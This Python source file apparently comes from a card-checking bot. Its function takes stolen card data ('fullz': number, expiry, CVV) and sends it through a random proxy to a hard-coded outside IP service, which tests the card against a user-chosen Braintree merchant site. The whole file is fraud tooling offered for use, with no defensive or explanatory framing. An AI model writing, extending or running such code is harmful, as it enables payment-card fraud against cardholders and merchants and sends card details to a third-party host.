import base64
import json
import random
import re
import string
import time
from fake_useragent import UserAgent
from FUNC.usersdb_func import *
from FUNC.defs import *
from bs4 import BeautifulSoup
import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import unquote, urlparse, parse_qs
from FUNC.defs import *
def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def create_braintree_auth(fullz, session,user_id):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user_info = await getuserinfo(user_id)

        a=20
        if len(str(ano)) < 4:
            ano = int(str(a) + str(ano))





        auto_bra = user_info.get("auto_bra", "N/A")

        if auto_bra == "N/A":
            return """
        🔒 Braintree Auth Site Not Set!

        You can manage it using the following commands:
        - 📌 Set a site: /setbra
        - ❌ Remove current site: /rmbra
        - 👁️ View current site: /viewbra
        """
        else:
            pass






        getproxy    = random.choice(open("FILES/proxy.txt", "r", encoding="utf-8").read().splitlines())

        link    = json.loads(open("FILES/deadsk.json", "r" , encoding="utf-8").read())["AUTO_CHK"]


        print(auto_bra)


        # site_info='https://www.bebebrands.com/'

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,de;q=0.8,it;q=0.7,ru;q=0.6,es;q=0.5',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        }

        response =requests.get(
            f'http://74.50.123.49:6060/b3auto?lista={cc}|{mes}|{ano}|{cvv}&siteurl={auto_bra}&proxy={getproxy}',
            headers=headers,
            verify=False,
        )


        print(response.text)


        response=gets(response.text,'"result": "','"')


        return response

    except Exception as e:
        return str(e)
